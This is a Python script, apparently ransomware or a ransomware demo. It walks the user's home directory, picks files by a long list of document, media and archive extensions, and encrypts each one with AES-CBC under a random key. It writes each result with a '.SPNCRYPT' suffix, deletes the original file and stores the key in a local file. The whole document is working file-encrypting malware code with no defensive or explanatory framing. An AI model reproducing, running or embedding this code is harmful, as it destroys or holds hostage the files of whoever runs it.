import os, random, struct, fnmatch, getpass, secrets, subprocess
from Crypto.Cipher import AES

file_exts = [
        'sake',
        'doc',
        'odt',
        'rtf',
        'md',
        'wpd',
        'ppt',
        'pps',
        'odp',
        'ods',
        'xlr',
        'xls',
        'txt',
        'pdf',
        'zip',
        'jpeg',
        'jpg',
        'JPG',
        'png',
        'gif',
        'bmp',
        'psd',
        'ico',
        'svg',
        'tif',
        'mp3',
        'flac',
        'aif',
        'wav',
        'wma',
        'ogg',
        'mpa',
        'cda',
        'mp4',
        'wmv',
        'mpg',
        'mpeg',
        'm4v',
        'h264',
        'mkv',
        '3g2',
        '3gp',
        'avi',
        'mov',
        'flv',
        '7z',
        'tar',
        'rar',
        'gz',

    ]


username = getpass.getuser()	
localRoot = r'/Users/' + username + r'/'

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):

    if not out_filename:
        out_filename = in_filename + '.SPNCRYPT'

    iv = os.urandom(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:

        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))
    return out_filename

key = secrets.token_bytes(32)
if os.path.exists("SPNCRYPT.key"):
  os.remove("SPNCRYPT.key")
file_out = open("SPNCRYPT.key", "wb")
file_out.write(key)
file_out.close()


system = os.walk(localRoot, topdown=True)
for root, dir, files in system:
    for file in files:
        file_path = os.path.join(root, file)
        if not file.split('.')[-1] in file_exts:
            continue
        else:
            try:
                encrypt_file(key, file_path)
                os.remove(file_path)
                print(f'Encrypting: {file_path}')
            except:
                continue

